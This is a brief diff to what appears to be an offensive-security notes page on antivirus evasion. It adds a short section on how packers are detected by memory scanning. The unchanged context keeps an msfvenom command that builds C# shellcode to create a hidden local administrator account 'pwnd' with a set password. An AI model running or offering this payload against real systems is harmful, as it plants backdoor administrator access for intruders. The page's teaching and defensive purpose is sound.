@@ -99,3 +99,6 @@ single command executed instead of a reverse shell, the AV will have a harder ti
 msfvenom -a x64 -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp 
 ```
 
+## Counter moves
+
+Packers compress and obfuscate to break static analysis, yet the unpacking stub and the unpacked image in memory stay visible. Memory scanning and unpack-on-execute detection are the counters. Defenders' notes on this are under [plausibility as cover](https://blue.tymyrddin.dev/docs/counter/evasion/).
